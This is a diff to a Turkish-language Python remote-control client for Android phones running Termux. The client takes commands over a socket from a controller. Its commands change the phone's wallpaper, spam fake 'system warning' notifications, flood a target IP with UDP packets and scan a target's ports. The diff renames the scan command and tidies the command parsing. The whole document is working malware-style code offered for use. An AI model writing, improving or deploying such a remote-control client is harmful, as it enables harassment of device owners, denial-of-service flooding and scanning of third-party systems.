@@ -22,7 +22,7 @@ def arkaplan_degistir(resim_url):
         try:
             os.system("termux-wallpaper -t lock -f duvar.jpg")
         except:
-            pass  # cihaz desteklemiyorsa hata verme
+            pass
         s.send("[✓] Ana ve kilit ekrani degistirildi\n".encode())
     except:
         s.send("[!] Duvar kagidi degistirilemedi\n".encode())
@@ -37,7 +37,7 @@ def uyari_bildirimi(mesaj):
 
 def uyari_spam(mesaj, adet):
     for i in range(adet):
-        os.system(f'termux-notification --title "⚠️ Sistem UYARISI!" --content "{mesaj}" --priority high --vibrate 1000')
+        os.system(f'termux-notification --title \"⚠️ Sistem UYARISI!\" --content \"{mesaj}\" --priority high --vibrate 1000')
     s.send("[!] Uyari spam gonderildi\n".encode())
 
 def udp_yolla(ip, port, sayi):
@@ -69,9 +69,12 @@ def google_ac():
 while True:
     try:
         komut = s.recv(1024).decode().strip()
+        print(f"[FSOCIETY@PHONE ~]$ {komut}")
+
         if komut.startswith("arkaplan "):
             _, url = komut.split(" ", 1)
             arkaplan_degistir(url)
+
         elif komut.startswith("bildirim "):
             try:
                 _, mesaj, flag, adet = komut.split(" ")
@@ -80,35 +83,43 @@ while True:
                     s.send("[+] Bildirim gonderildi\n".encode())
             except:
                 s.send("[!] Hata: bildirim komutu\n".encode())
+
         elif komut.startswith("uyari "):
             _, mesaj = komut.split(" ", 1)
             uyari_bildirimi(mesaj)
+
         elif komut.startswith("uyarispam "):
             try:
-                komut = komut.replace("uyarispam ", "")
-                if " -m " in komut:
-                    mesaj, miktar = komut.split(" -m ")
-                    uyari_spam(mesaj.strip(), int(miktar.strip()))
+                args = komut.replace("uyarispam ", "")
+                if " -m " in args:
+                    mesaj, adet = args.rsplit(" -m ", 1)
+                    uyari_spam(mesaj.strip(), int(adet.strip()))
             except:
                 s.send("[!] Hata: uyarispam komutu\n".encode())
+
         elif komut.startswith("udp "):
             try:
                 _, hedef_ip, hedef_port, paket_sayisi = komut.split(" ")
                 udp_yolla(hedef_ip, int(hedef_port), int(paket_sayisi))
             except:
                 s.send("[!] Hata: udp komutu\n".encode())
-        elif komut.startswith("scan "):
+
+        elif komut.startswith("port "):  # scan yerine artık port komutu
             try:
                 _, hedef_ip, bas, son = komut.split(" ")
                 port_tara(hedef_ip, int(bas), int(son))
             except:
-                s.send("[!] Hata: scan komutu\n".encode())
+                s.send("[!] Hata: port komutu\n".encode())
+
         elif komut == "google":
             google_ac()
+
         elif komut == "exit":
             s.close()
             break
+
         else:
             s.send("[!] Gecersiz komut\n".encode())
+
     except:
         break
